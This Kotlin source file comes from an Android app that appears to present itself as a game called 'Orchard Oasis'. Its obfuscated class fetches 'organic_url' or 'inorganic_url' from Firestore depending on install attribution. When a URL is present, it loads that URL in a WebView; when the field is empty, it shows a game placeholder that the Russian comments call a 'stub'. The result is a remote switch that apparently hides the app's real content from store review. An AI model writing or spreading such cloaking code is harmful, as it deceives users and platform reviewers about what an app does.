package com.example.orchardoasis.mod.de

import android.content.Context
import android.content.SharedPreferences
import android.os.Handler
import android.os.Looper
import android.preference.PreferenceManager
import com.amplitude.api.AmplitudeClient
import com.example.orchardoasis.mod.ct111.FOR_GAME
import com.example.orchardoasis.mod.ct111.FOR_WEBVIEW
import com.example.orchardoasis.mod.ct111.NOT_ORGANIC_INSTALL
import com.example.orchardoasis.mod.ct111.ORGANIC_INSTALL
import com.example.orchardoasis.mod.es.pdtCntStrtpplctn
import com.example.orchardoasis.mod.es.stVlnRwLnk
import com.example.orchardoasis.mod.es.svLstrl
import com.example.orchardoasis.mod.es.svMnrl
import com.example.orchardoasis.vw.ia.iTnSptiV
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

class FsTOreOasisOrch(private val ntrfcctvt: iTnSptiV, private val cntxt: Context, private val mpltd: AmplitudeClient, private val tmr:Long) {

    private val dtbs = FirebaseFirestore.getInstance()
    private val sp: SharedPreferences = PreferenceManager.getDefaultSharedPreferences(cntxt)

    fun getUrlFromDatabase(stts:String,lst:List<String>?,pckgNm:String){
        CoroutineScope(Dispatchers.IO).launch {
            dtbs.collection("COLLECTION_URL")
                .document("DOCUMENT_URL")
                .get()
                .addOnSuccessListener { data ->
                    when(stts){
                        ORGANIC_INSTALL -> {
                            Handler(Looper.getMainLooper()).post {
                                if(data["organic_url"]!=""){

                                    val tmrBcknd = ((System.currentTimeMillis()-tmr)/1000).toInt() // время получения сырой ссылки

                                    val nwUrl = data["organic_url"].toString().stVlnRwLnk(lst,pckgNm,cntxt)

                                    mpltd.logEvent("backend_url",JSONObject().put("url",data["organic_url"]))
                                    mpltd.logEvent("first_url",JSONObject().put("url",nwUrl))
                                    mpltd.logEvent("backend_received_time",JSONObject().put("time",tmrBcknd))

                                    sp.pdtCntStrtpplctn()
                                    sp.svMnrl(nwUrl) // сохранение полученной ссылки
                                    sp.svLstrl(nwUrl) // сохранение полученной ссылки
                                    ntrfcctvt.gTStbpplctn(FOR_WEBVIEW) // переход для показа WebView
                                }else{
                                    ntrfcctvt.gTStbpplctn(FOR_GAME) // переход на заглушку,если ссылка пустая
                                }
                            }
                        }
                        NOT_ORGANIC_INSTALL -> {
                            Handler(Looper.getMainLooper()).post {
                                if (data["inorganic_url"]!=""){

                                    val tmrBcknd = ((System.currentTimeMillis()-tmr)/1000).toInt() // время получения сырой ссылки

                                    val nwUrl = data["inorganic_url"].toString().stVlnRwLnk(lst,pckgNm,cntxt)

                                    mpltd.logEvent("backend_url",JSONObject().put("url",data["inorganic_url"]))
                                    mpltd.logEvent("first_url",JSONObject().put("url",nwUrl))
                                    mpltd.logEvent("backend_received_time",JSONObject().put("time",tmrBcknd))

                                    sp.pdtCntStrtpplctn()
                                    sp.svMnrl(nwUrl) // сохранение полученной ссылки
                                    sp.svLstrl(nwUrl) // сохранение полученной ссылки
                                    ntrfcctvt.gTStbpplctn(FOR_WEBVIEW) // переход для показа WebView
                                }else{
                                    ntrfcctvt.gTStbpplctn(FOR_GAME) // переход на заглушку,если ссылка пустая
                                }
                            }
                        }
                    }
                }
        }
    }

    // функция проверки значения в органике
    fun checkIsEmptyOrganic(){
        CoroutineScope(Dispatchers.IO).launch {
            dtbs.collection("COLLECTION_URL")
                .document("DOCUMENT_URL")
                .get()
                .addOnSuccessListener { data ->
                    Handler(Looper.getMainLooper()).post{
                        if(data["organic_url"]==""){
                            ntrfcctvt.gTStbpplctn(FOR_GAME) // переход на заглушку при пустой органике
                        }else{
                            ntrfcctvt.showLastWebView()     // показ последней ссылки на экране заглушки
                        }
                    }
                }
        }
    }

    // функция проверки значения в неорганике
    fun checkIsEmptyNotOrganic(){
        CoroutineScope(Dispatchers.IO).launch {
            dtbs.collection("COLLECTION_URL")
                .document("DOCUMENT_URL")
                .get()
                .addOnSuccessListener { data ->
                    Handler(Looper.getMainLooper()).post{
                        if(data["inorganic_url"]==""){
                            ntrfcctvt.gTStbpplctn(FOR_GAME) // переход на заглушку при пустой неорганике
                        }else{
                            ntrfcctvt.showLastWebView()     // показ последней ссылки на экране заглушки
                        }
                    }
                }
        }
    }

}